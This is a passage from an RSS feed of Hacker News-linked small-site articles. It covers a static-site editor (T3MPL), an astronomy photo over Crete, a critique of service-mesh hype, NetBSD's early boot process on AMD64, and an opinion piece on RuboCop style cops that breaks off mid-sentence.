reading/writing to/from S3 or ABS on behalf of clients, providing access control, and caching blocks for faster retrieval.</p><h3>References</h3><ul role="list"><li>Ismail Mahmoud, Salman Niazi, Gautier Berthou, …</li></ul></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3">https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3</a></em></p>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149154</guid>
            <pubDate>Thu, 19 Nov 2020 13:17:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Generate Admin Panel for Your Static Website with T3MPL]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149099">thread link</a>) | @b4rtazz
<br/>
November 19, 2020 | https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/ | <a href="https://web.archive.org/web/*/https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<header>
		<h2><a href="https://t3mpl.n4no.com/">&lt;/&gt; T3MPL</a></h2>

		<nav>
			<ul>
				<li>
					<a href="https://t3mpl.n4no.com/docs/">Docs</a>
				</li>
				<li>
					<a href="https://t3mpl.n4no.com/donate/">Donate</a>
				</li>
				<li>
					<a href="https://github.com/b4rtaz/t3mpl-editor" targe="_blank">GitHub</a>
				</li>
				<li>
					<a href="https://t3mpl.n4no.com/editor/#manifest=../templates/t3mpl-one/template.yaml">Editor</a>
				</li>
			</ul>
		</nav>
	</header>

<div>
	<article>
		<p><img src="https://t3mpl.n4no.com/content/image/5841gmvz8i7y8mycchzx.png" alt="Generate Website Admin Panel"></p>

<p>Creating admin panel for small website is an expensive thing. Each site has a different structure, and it needs different admin sections. This site has a news section, that doesn't. This site has a landing page with five texts, that site has only one image there. Familiar?</p>
<p>The popular choice to reduce a cost is use Wordpress. But Wordpress is dedicated to blog/news websites. Any deviation from the general purpose of Wordpress means a problem. Of course the market has many plugins and extensions to solve that. Unluckily joining together many elements are difficult and problematic.</p>
<p>So what to do? You may use T3MPL. T3MPL is the generic website editor and the static website generator in one. <strong>When you prepare a template, T3MPL automatically generates editor for your template.</strong></p>
<h4 id="🎹-template-contract">🎹 Template Contract</h4>
<p>Look at <strong>the template contract</strong> bellow. What is it? It is a definition of a data structure in your template. To define that it's needed to create a simple YAML file (template.yaml).</p>
<pre><code>dataContract:
  LANDING:
    sections:
      APP:
        properties:
          TITLE:
            type: (text)
            defaultValue: Hello World
          DESCRIPTION:
            type: (markdown)
            defaultFilePath: content/app-description.md
          PREVIEW:
            type: (image)
            defaultFilePath: assets/app-preview.jpg
            width: 1084
            height: 840
...</code></pre>
<h4 id="👓-template">👓 Template</h4>
<p>You can use that data directly in a template file. Templates are powered by <a href="https://github.com/handlebars-lang/handlebars.js">handlebars</a>.</p>
<pre><code>&lt;div class="landing"&gt;
  &lt;h3&gt;{{LANDING.APP.TITLE}}&lt;/h3&gt;

  {{{$markdown LANDING.APP.DESCRIPTION}}}

  &lt;img src="{{{$image LANDING.APP.PREVIEW}}}" alt="..." /&gt;
&lt;/div&gt;</code></pre>
<h4 id="💥-generic-editor">💥 Generic Editor</h4>
<p>You have everything now. <strong>T3MPL automatically generates an editor for your template.</strong> You may edit your website with live preview now.</p>
<p><img src="https://t3mpl.n4no.com/content/image/xjwaxgk21nnqo5ton12x.png" width="270"></p>

<h4 id="🚀-publishing">🚀 Publishing</h4>
<p>When you finish editing, you may want to publish your website. You can do that in two ways.</p>
<ul>
<li><strong>Publish to .zip file</strong> - T3MPL generates your final website to .zip file. You should upload website files to your server. In this case, your server doesn't have special requirements like PHP or Ruby. Generated files should work on the most popular servers like Apache, Nginx and IIS.</li>
<li><strong>Use T3MPL Server</strong> - if you want to modify your website in a more professional way, you can use T3MPL Server. It requires Node.js on your server. The server allows you to modify your website directly from the editor. In this case, if you click the "publish" button, all changes will be published immediately.</li>
</ul>
<p>So you can use T3MPL according to how often you change your site.</p>
<p>If you have a template and a data you may also generate your website by T3MPL Cli.</p>
<h4 id="📣-summary">📣 Summary</h4>
<p>T3MPL provides a very simple concept, how to connect the data structure, the template and the editor. With T3MPL you don't care about the admin panel because T3MPL creates the admin panel when you create a website template. This saves time a lot. And money.</p>
<p>At the end, you may also check:</p>
<ul>
<li><a href="https://github.com/b4rtaz/t3mpl-templates">Free T3MPL Templates repository</a> (many examples)</li>
<li><a href="https://github.com/b4rtaz/t3mpl-editor">T3MPL Editor repository</a></li>
<li><a href="https://github.com/b4rtaz/t3mpl-server">T3MPL Server repository</a></li>
<li><a href="https://t3mpl.n4no.com/">Online T3MPL Editor</a></li>
</ul>
<p><em>— Written by <a href="https://twitter.com/b4rtaz">b4rtaz</a></em></p>

	</article>
</div>

</div></div>]]>
            </description>
            <link>https://t3mpl.n4no.com/docs/dont-write-admin-panel-for-small-website/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149099</guid>
            <pubDate>Thu, 19 Nov 2020 13:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Millennials, the Dying Children]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25149073">thread link</a>) | @krebs_liebhaber
<br/>
November 19, 2020 | https://lexic.co/barfblog/millennials-dying-children | <a href="https://web.archive.org/web/*/https://lexic.co/barfblog/millennials-dying-children">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lexic.co/barfblog/millennials-dying-children</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149073</guid>
            <pubDate>Thu, 19 Nov 2020 13:08:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Light and Glory over Crete]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25148776">thread link</a>) | @jayass
<br/>
November 19, 2020 | https://misspellede.com/us/light-and-glory-over-crete/ | <a href="https://web.archive.org/web/*/https://misspellede.com/us/light-and-glory-over-crete/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <div> 
                            <p><img loading="lazy" src="https://apod.nasa.gov/apod/image/2011/CreteSky_Slovinsky_1080.jpg" alt="Light and Glory over Crete cover image"></p>
            <p><a href="https://misspellede.com/us/cosmos/">cosmos</a></p><p>Tomáš Slovinský • 2020-11-16</p><h2>Greek island of Crete</h2>



<p>The month was July, the place was the Greek island of Crete, and the sky was spectacular. Of course there were the usual stars like Polaris, Vega, and Antares -- and that common asterism everyone knows: the Big Dipper. </p>



<p>But this sky was just getting started. The band of the Milky Way Galaxy stunned as it arched across the night like a bridge made of stars and dust but dotted with red nebula like candy. The planets Saturn and Jupiter were so bright you wanted to stop people on the beach and point them out. </p>



<p>The air glowed like a rainbow -- but what really grabbed the glory was a comet. Just above the northern horizon, Comet NEOWISE spread its tails like nothing you had ever seen before or might ever see again. Staring in amazement, there was only one thing to do: take a picture. </p>



<p><span>Coverage: NASA's SpaceX Crew-1 Mission</span></p>

        </div>
    </article></div>]]>
            </description>
            <link>https://misspellede.com/us/light-and-glory-over-crete/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25148776</guid>
            <pubDate>Thu, 19 Nov 2020 12:23:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[You don't need no service mesh]]>
            </title>
            <description>
<![CDATA[
Score 82 | Comments 35 (<a href="https://news.ycombinator.com/item?id=25148642">thread link</a>) | @SerCe
<br/>
November 19, 2020 | https://serce.me/posts/23-07-2020-you-dont-need-no-service-mesh/ | <a href="https://web.archive.org/web/*/https://serce.me/posts/23-07-2020-you-dont-need-no-service-mesh/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Hi!</p>
<p>Service meshes have attracted an enormous amount of hype around them. With at least a few talks about service meshes during each tech conference, one can easily be convinced that having a service mesh in their infrastructure is a must. However, hype isn’t a good indicator of whether the new shiny tech is the right solution for your problems. So below, I’ll try to express an anti-hype opinion on service meshes to hopefully make it less confusing when you want to decide whether you may or may not need one.</p>
<p><span><img src="https://serce.me/img/servicemesh/rick.png" alt="rick"></span></p>
<div>
<blockquote>
<p>There’s a lesson here, and I’m not going to be the one to figure it out.</p>
</blockquote>
<p>
— Rick Sanchez
</p>
</div>
<div>
<h3 id="_the_invention">The invention</h3>
<p>Let’s take a step back in history and take a look at one of the <a href="https://eng.lyft.com/envoy-7-months-later-41986c2fd443">early articles</a> about introducing Envoy at Lyft.</p>
<div>
<blockquote>
<p>As it turns out, almost every company with a moderately-sized service oriented architecture is having the same problems that Lyft did prior to the development and deployment of Envoy:</p>
<div>
<ul>
<li>
<p>An architecture composed of a variety of languages, each containing a half-baked RPC library, including partial (or zero) implementations of rate limiting, circuit breaking, timeouts, retries, etc.</p>
</li>
<li>
<p>Differing or partial implementations of stats, logging, and ….</p>
</li>
</ul>
</div>
</blockquote>
</div>
<p>While Envoy is not a service mesh by itself, the outlined problems describe the exact reason why service meshes were invented. They add “rate limiting, circuit breaking, …” and other reliability, observability, and security features to the services by enforcing the communication to go through the service mesh proxies, a data plane. Additionally, they require a separate component, a control plane, to control the configuration.</p>
<p>However, at this point, a lot of people miss the context in which service meshes were introduced. Service meshes are able to solve the problem not because it’s impossible to solve them in any other way. There are many battle-proof RPC libraries that take on the challenges of a separate data plane layer, <a href="https://github.com/twitter/finagle">Finagle</a>, <a href="https://github.com/grpc">gRPC</a>, <a href="https://github.com/line/armeria">Armeria</a>, <a href="https://github.com/apple/servicetalk">Servicetalk</a>, to name a few. After all, the very first service mesh - Linkerd 1.0 <a href="https://github.com/linkerd/linkerd">is powered by Finagle</a>. The RPC libraries will need a component which provides service discovery and configuration management to make it a true mesh. For instance, Zookeeper, or Consul, a component that service meshes call a control plane.</p>
<p>Why introduce a new concept to solve the problems that have been solved before? The service mesh concept wasn’t introduced to address problems that hadn’t been addressed before but rather address them in a way that doesn’t require any modifications to the application code, which is incredibly convenient when it’s hard to introduce an RPC layer into an existing heterogeneous microservice environment.</p>
<p>When you hear service mesh, Istio with Envoy might be the first thing that comes to mind, but it wasn’t the first service mesh to enter the market. Linkerd authors who pioneered the space, described exactly this situation in the <a href="https://linkerd.io/2017/04/25/whats-a-service-mesh-and-why-do-i-need-one/#why-is-the-service-mesh-necessary">"why is the service mesh necessary"</a>. Interestingly, in many hype-y articles on the Internet this context is often forgotten, or omitted.</p>
<p>Solving a problem well, even if it’s a problem that a lot of people have, doesn’t magically provide the tech with a lot of hype. There is always a sponsor behind it. I don’t know who the sponsor was here, and I’m going to speculate, but it’s hard to sell an RPC library in the world where open source is a fundamental requirement. There is no clear business model there, that’s why most of the mature RPC libraries were open-sourced by large tech companies for which it’s not a part of the core business model. A library is just code, not a piece of infrastructure. Service meshes are a different story. It’s an isolated non-trivial piece of infrastructure. As a vendor, not only can you provide consultancy around the configuration and deployment, but you can also sell complete hosted solutions around it.</p>
</div>
<div>
<h3 id="_disillusionments">Disillusionments</h3>
<p>Now that we’ve established the problems, the solution, and most importantly, the context in which the solution was made, let’s take a look at the alternatives. The most obvious one, in the spirit of KISS, is to use an RPC library for your preferred language. Here is where the context is crucial: if you have a large fleet of services, each written in its own language/ecosystem, and the only language that they share is HTTP then having a single shared RPC library is going to be hard. Perhaps, you’ve got a fabric of deployed and running services, but everyone is afraid of touching them, no one knows how they work, and each redeploy is an adventure. A service mesh is here to help you, because at least you’ll be able to roll out new infrastructure features to the mesh regularly.</p>
<p>On the other hand, if you have a fleet of healthy services written in a single application stack, then it’s a good idea to think twice before introducing a service mesh. By simply introducing or evolving a shared RPC library, you’ll get the exact same benefits and avoid dealing with the downsides of maintaining service meshes. By studying the service mesh limitations thoroughly, you can avoid finding yourself in the trough of disillusionment.</p>
<p><span><img src="https://serce.me/img/servicemesh/curve.png" alt="Hype Cycle"></span></p>
<div>
<h4 id="_different_ecosystem">Different ecosystem</h4>
<p>The ecosystem of the service mesh of your choice will likely be different from the ecosystem of your services. Beautiful websites always make you believe that the solution is plug’n’play, always works and never goes down. In reality, sooner or later problems, bugs, quirks in behaviour will reveal themselves, as they always do. At that point, you’ll need to have engineers who work on the service-mesh’s ecosystem which when it’s different from the main app, effectively limits the set of people who can introduce changes or fix problems. This is likely to reintroduce silos, which is against the whole DevOps spirit. Yes, having a DevOps team of engineers who are doing DevOps-y things <a href="https://continuousdelivery.com/2012/10/theres-no-such-thing-as-a-devops-team/">is against DevOps</a>.</p>
</div>
<div>
<h4 id="_unnecessary_overhead">Unnecessary overhead</h4>
<p>Not only having a proxy in front of each service adds overhead (often significant, talking about <a href="https://istio.io/latest/docs/ops/deployment/performance-and-scalability/">90pt</a> rather than 99pt in the performance summary <a href="https://www.infoq.com/presentations/latency-response-time/">doesn’t make software run faster</a>) and consumes resources, but you also requires time (or rather a team of people) to manage them. Yes, it can help to make some of the tasks potentially easier - yay, you can now add canary deployments with a few lines of YAML to simple applications now. However, you still need to manage canary deployments of the proxies themselves which don’t have a proxy in front of them. The problems just get pushed up the stack.</p>
</div>
<div>
<h4 id="_limiting_your_architecture_to_what_the_proxy_supports">Limiting your architecture to what The Proxy supports.</h4>
<p>As you’re reading this paragraph, HTTP/3 is slowly being rolled out to the Internet. It uses UDP as transport. Why use UDP rather than create a completely new protocol you ask? That’s because anything but TCP and UDP is simply “blocked” by the boxes, various proxies on the internet - routers, gateways, etc. This phenomenon got named <a href="https://http3-explained.haxx.se/en/why-quic/why-ossification">ossification</a>. So, only TCP or UDP are left is the practical chose, and even UDP is partially blocked by various corporate proxies which slows down the adoption.</p>
<p>Even though your microservice environment is probably much smaller compared to the Internet, you can draw parallels with service meshes. Proxies can ossify your application architecture by limiting how your services talk to each other, and there is not much benefit in having proxies if you can bypass them. Suppose you want to build a reactive application which is using RSocket over pure tcp? Or perhaps a message-driven application using an actor model? Or maybe push the performance boundaries with Aeron? Not going to happen until the box in the middle becomes aware of the protocol.</p>
</div>
</div>
<div>
<h3 id="_do_i_need_one">Do I need one?</h3>
<p>What does it all mean for you as an engineer? The answer to whether you need to adopt the service mesh approach comes down to the state of the microservice environment you’re trying to improve. As we have established, compared to an RPC framework, service meshes allow you to:</p>
<div>
<ol>
<li>
<p>Deploy the infra changes more often than deploying your services.</p>
</li>
<li>
<p>Introduce infra changes without touching the service code.</p>
</li>
</ol>
</div>
<p>The point 1. is important when for whatever reason you can’t redeploy your services very often, e.g. maybe no one remembers how it’s done anymore, or maybe there are other restrictions. The point 2. is important when your stack is heterogeneous, e.g. some services are built in Go, some in Java, some in Haskell, etc. Where are you on the interval from a huge set of heterogeneous services with unknown deployment schedules to a set of homogenous regularly deployed services defines whether a service mesh is the best solution for you.</p>
</div>
<div>
<h3 id="_conclusion">Conclusion</h3>
<p>Service meshes have a lot of hype around them, and way too much in my opinion. However, before committing to a piece of technology, it’s crucial to understand the problems it solves, and the context in which the solution was made. A service mesh is not an ultimate “good practice” but simply one of the patterns to solve a set of issues, and it’s quite a heavy one.</p>
<p>Rather than jumping on board, look carefully - the last thing you want is to find out that you have invested in a solution for a problem that you don’t have. Service meshes are an amazing piece of tech solving a whole lot of problems. Not in every case, it is the best solution.</p>
</div>
<div>
<h3 id="_thank_you_to">Thank you to</h3>
<div>
<ul>
<li>
<p>You for reading this article.</p>
</li>
<li>
<p><a href="https://twitter.com/ptuls">Paul Tune</a> for reviewing the article.</p>
</li>
</ul>
</div>
</div>
<div>

<hr>
<blockquote><p lang="en" dir="ltr">"You don't need no Service Mesh". Just published a new blog post with an anti-hype opinion on the over-hyped topic. <a href="https://t.co/SVXS3nWKzj">https://t.co/SVXS3nWKzj</a></p>— Sergey Tselovalnikov (@SerCeMan) <a href="https://twitter.com/SerCeMan/status/1286242507664191488?ref_src=twsrc%5Etfw">July 23, 2020</a></blockquote> 
</div>

</div></div>]]>
            </description>
            <link>https://serce.me/posts/23-07-2020-you-dont-need-no-service-mesh/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25148642</guid>
            <pubDate>Thu, 19 Nov 2020 12:00:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Before the BSD Kernel Starts: Part One on AMD64]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25148455">thread link</a>) | @fcambus
<br/>
November 19, 2020 | https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>System initialization is one of the niche areas that few people look into.
The exact details vary considerably between different platforms, firmwares, CPU architectures and operating systems, making it difficult to learn it all.
Usually, if something is not working correctly during the early stages of system startup or if the OS does not boot, it rarely has anything to do with the code responsible for booting. Most of the time, it is due to other factors, such as the boot media or BIOS configuration.
However, understanding the early initialization process may help debug or to familiarize yourself with a new platform or hardware.</p>

<p>In this article, I will walk through the early kernel initialization process, defining the meaning of this term.
System initialization is a broad topic that ranges from the platform’s hardware design all the way up to typical functions of an operating system such as handling I/O operations.
It is not possible to cover the entire topic adequately within the scope of an article. In this first part I will describe the well-known AMD64: 64-bit platform. I am going to highlight a very interesting part of the initialization process the early initialization of the kernel.
Later, I will compare it with ARM64. In both cases I will discuss the topic in the context of NetBSD, the operating system known for its portability.</p>

<h2 id="the-bigger-picture">The Bigger Picture</h2>

<p>The CPU starting point is called the reset vector: the CPU bootstraps, then fetches and executes the first physical address at location <code>0xFFFFFFF0</code>. The bootloader must always contain a jump to the initialization code in these last top 16 bytes. The CPU is in a variant of a real mode called unreal-mode. 16-bit addressing with segments can address up to 1 MiB of memory.
After the reset, the CS descriptor cache base field contains a special fixed 32-bit value: <code>0xFFFF 0000</code>. (In real-mode a user can change only the lower 16 bits of CS; the upper half, also called the base, is set on reset and hidden).
Using this technique, the instruction pointer addresses relative to the last 64 KiB fragment of the physical memory, which is usually wired to read-only flash memory, where part of the platform firmware (BIOS/UEFI) is located.</p>

<h3 id="bios-or-uefi">BIOS or UEFI?</h3>

<p>BIOS (Basic Input/Output System) is a term used for legacy platform initialization firmware and an interface between the operating system and platform.
It is used mostly with IBM PC compatible machines, such as personal computers or server type machines.
On the other hand, UEFI (Unified Extensible Firmware Interface) is a generic specification, not a particular implementation, and similarly to the BIOS defines an interface between the operating system and platform firmware. The goal of UEFI is to replace legacy interfaces, also is designed to be universal, it can be applied to PC’s or servers as well as embedded devices.
This newer standard was developed to overcome limitations of older standards such as 16-bit processor mode with 1 MB of addressable space, or maximum hard drive sizes from which the operating system can be booted. It also brings new features like secure boot or UEFI runtime services.
Describing UEFI and how it differs from BIOS is out of the scope of this article, but what is important to know is that both BIOS and UEFI based firmware will perform platform initialization, and later load the operating system from the physical medium.
The way that the system is loaded differs between UEFI and BIOS. The newer standard allows for more advanced functionalities, such as GPT partition layout where the BIOS operates on boot sectors. For this article, we will start with the legacy boot process based on Master Boot Record (MBR). The topic of UEFI can be extended in the future if needed.</p>

<h3 id="legacy-bios">Legacy BIOS</h3>

<p>When the CPU starts after reset, most of the platform hardware is not ready to use: system memory connected as a DIMMs modules is not yet detected and initialized, timers and interrupts aren’t ready, nor is the PCI bus working yet.
Hardware has to be initialized, and that is the essential role of platform firmware. A more detailed description of initialization process can be found by a curious reader in Minimal Boot Loader for Intel® Architecture, here I will point out only the critical functionalities.
At the beginning, firmware initialization code needs to initialize the CPU and platform chipsets can only then prepare memory to work.
After the memory is operational in a phase called post memory initialization, the firmware copies itself from the slow flash memory to the system DRAM. Initialization code can start execution only after it prepares software environment as stack or the CPU mode.
When the CPU jumps to memory address below 1MB in the DRAM (this memory region is historically reserved for that purpose), it still has many things to do before it is be able to communicate with external devices.
At the latest phase, IO devices are initialized as well as the PCI bus is enumerated. Once that is done, initialization code will search for a legacy operating system to boot, load the MBR sector from disk to the memory and execute it.</p>

<p>BIOS loads the first sector, called the MBR (512 bytes), from the beginning of the hard disk. That region must end with the magic number (also called a signature) 0xAA55. This sector contains instructions that have to load further sectors into the memory to execute a higher-level bootstrap program for a simple reason: size and how many instructions can fit into 512 bytes.
Only in that way can we have a more complex program that will find and execute the kernel of the operating system.
Before I describe the process of executing kernel and making it operational in the long mode, we need to know what the starting point of a typical UNIX kernel is.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Loading_MBR_2_gxwj0i.svg" alt="Master Boot Record"></p>

<h2 id="the-kernel-is-an-elf-file">The Kernel is an ELF file</h2>

<p>The two most common executable file formats are ELF (Executable and Linkable Format) and PE (Portable Executable).
In the UNIX environment, ELF is the typical format for program binaries, while PE is widely used on Windows.
It should not be a surprise to the reader that the NetBSD kernel is also ELF executable.</p>

<h3 id="before-the-main">Before the main</h3>

<p>We are used to thinking that programs start with some kind of <code>main</code> function. Those of us who have studied libraries or flow of execution can recall a lower level <code>_start</code> function that was called when the program was loaded into memory. In ELF executables, the program actually starts at an entry point that is defined inside the header of the file (<code>Entry point address</code>).
We can easily verify this claim using the readelf program on our kernel binary:</p>

<div><pre><code data-lang="bash">$ readelf -h ./netbsd
ELF Header:
  Magic:   7f <span>45</span> 4c <span>46</span> <span>02</span> <span>01</span> <span>01</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> 
  Class:                             ELF64
  Data:                              <span>2</span><span>'</span>s complement, little endian
  Version:                           <span>1</span> <span>(</span>current<span>)</span>
  OS/ABI:                            UNIX - System V
  ABI Version:                       <span>0</span>
  Type:                              EXEC <span>(</span>Executable file<span>)</span>
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0xffffffff80209000		<span>&lt;&lt;&lt;</span>
  Start of program headers:          <span>64</span> <span>(</span>bytes into file<span>)</span>
  Start of section headers:          <span>219286488</span> <span>(</span>bytes into file<span>)</span>
  Flags:                             0x0
  Size of this header:               <span>64</span> <span>(</span>bytes<span>)</span>
  Size of program headers:           <span>56</span> <span>(</span>bytes<span>)</span>
  Number of program headers:         <span>2</span>
  Size of section headers:           <span>64</span> <span>(</span>bytes<span>)</span>
  Number of section headers:         <span>39</span>
  Section header string table index: <span>37</span></code></pre></div>

<p>We can now check the name of the symbol with such an address, but only if we use non stripped kernel!</p>

<div><pre><code data-lang="bash">$ readelf --syms ./netbsd.gdb | grep ffffffff80209000
 <span>41333</span>: ffffffff80209000    <span>0</span> NOTYPE GLOBAL DEFAULT <span>1</span> __text_user_end
 <span>48452</span>: ffffffff80209000 <span>1096</span> FUNC   GLOBAL DEFAULT <span>1</span> start</code></pre></div>

<p>The starting function for our kernel is <code>start</code>.
Before we look into this function, we need to understand how the CPU’s knows this starting point.
Before the operating system can execute the program, compiled into ELF format, it has to load it into memory.
When the program runs on bare metal (without the operating system), it needs to take care of loading into memory by itself.
This is one of the reasons why we need programs such as bootloaders.</p>

<h2 id="a-few-words-about-bootloaders">A Few Words About Bootloaders</h2>

<p>There are a lot of possible ways and programs we can use to setup our platform.
Different boot loader programs such as <code>grub</code> or <code>u-boot</code> can be configured to work together on various hardware and support operating systems.
Early loader programs provide much flexibility in configuration.
I mentioned earlier two partition schemes: GPT and MBR, both can be used together as a hybrid.
I don’t want go too deeper into disk layout as such a description would end up with multiple tables and descriptions, so I will focus on the NetBSD kernel initialization for the default configuration.</p>

<p>After the BIOS finds a valid sector (with <code>0xAA55</code> signature), it loads the first disk sector (MBR) to physical address <code>0x7c00</code> . It also sets the <code>DL</code> register to drive the number from which MBR was loaded, and after that is done, firmware executes the loaded data.
For the x86 platform, the first two bootloaders are MBR (<code>mbr(8)</code>) and PBR whose names correspond to the sectors where they are placed: Master Boot Record and Partition Boot Record.
Traditionally, the MBR code relocates itself to a different physical memory location (<code>0x600</code>) and then locates the active
partition, reads its first sector (PBR) to the address <code>0x7c00</code> and jumps to it.
The PBR is designed to work with the classical NetBSD chain where it is loaded by the own MBR as well as to work with GPT partition, in both cases there is a difference in behavior.
In the case of GPT the <code>EAX</code> register will contain the constant <code>!GPT</code> (in hex: <code>54504721</code>) and the MBR structure, which contains Logical Block Address (LBA) from which was loaded and some extra information like OS type or GPT partition …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/">https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25148455</guid>
            <pubDate>Thu, 19 Nov 2020 11:31:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Beef with RuboCop]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 83 (<a href="https://news.ycombinator.com/item?id=25147990">thread link</a>) | @todsacerdoti
<br/>
November 19, 2020 | https://www.rubypigeon.com/posts/my-beef-with-rubocop/ | <a href="https://web.archive.org/web/*/https://www.rubypigeon.com/posts/my-beef-with-rubocop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Consider a hypothetical class that filters out unsafe HTML elements:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>else</span>
      <span>nil</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The default RuboCop settings would have us change it to this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>super</span> <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Let us feast on a three-course meal of opinion about why this is
worse.</p>

<h2 id="that-nil-was-written-for-a-purpose">That <code>nil</code> Was Written For A Purpose</h2>

<p>My first beef — the hors d’oeuvre, if you will — is that
<code>Style/EmptyElse</code> wants us to change from an <em>explicit</em> <code>nil</code> return
value to an <em>implicit</em> one. It says there is a “redundant
else-clause”. I’ll tell you what’s redundant: the <code>Style/EmptyElse</code>
cop.</p>

<p>This cop would prefer that the <code>else</code> clause did not exist, like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>In terms of behaviour at runtime, this is exactly the same. In terms
of readability, it is not.</p>

<p>The explicit <code>nil</code> in the original implementation implies that the
method is being called for its return value — that it’s probably
functional, with inconsequential side effects.</p>

<p>Making the <code>nil</code> implicit says that <em>the return value is not
important</em>. This method now reads like it’s implemented by avoiding
side effects within <code>super</code>.</p>

<p>So which one is it? Is the filter supposed to work by returning <code>nil</code>,
or does it work by avoiding the side effects in the <code>super</code> call?
These are very different behaviours, and RuboCop just changed the
human interpretation from the correct one to the wrong one.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="its-not-a-guard-clause">It’s Not A Guard Clause</h2>

<p>My other beef (the main course) is with <code>Style/GuardClause</code>. This cop
takes conditionals and turns one of the branches into a guard clause
— something like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>return</span> <span>nil</span> <span>unless</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>

    <span>super</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Again, the runtime behaviour is identical, but the cop makes it less
readable.</p>

<p>Guard clauses are for bailing out early when you know that it’s not
necessary to run the rest of the method. They are usually trivial in
comparison to the <em>real</em> work done by the rest of the method. For
example, if we were implementing a sorting algorithm, then we could
have a guard clause for inputs with one element or less — there is
no need to run a sorting algorithm when there is nothing to sort.</p>

<p>Except in this case, we’re not “guarding” the rest of the method from
being run. That conditional is the <em>entire raison d’être of the
class</em>. It’s the most important part. The whole purpose of a filter is
to decide what elements stay in, and what elements get filtered out.</p>

<p>RuboCop has taken the most important part of the class and turned it
into a trivial-looking guard clause.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="branching-should-look-like-branching">Branching Should Look Like Branching</h2>

<p>My final qualm (is there such a thing as dessert beef?) is with
<code>Style/GuardClause</code> removing the obvious indenting of the two
branches, making it look like straight-line procedural code.</p>

<p>Most of the time, developers don’t so much <em>read</em> code as they do
<em>scan</em> code. We don’t read from left to right, top to bottom, as if
the codebase were the world’s most boring novel. We skim over code,
navigating by the colours of syntax highlighting and the shapes
made by indentation.</p>

<p>So when we’re skimming over the original code, trying to find the
conditional — which we’ve already established as being the most
important part of the class — we will find two landmarks: a line
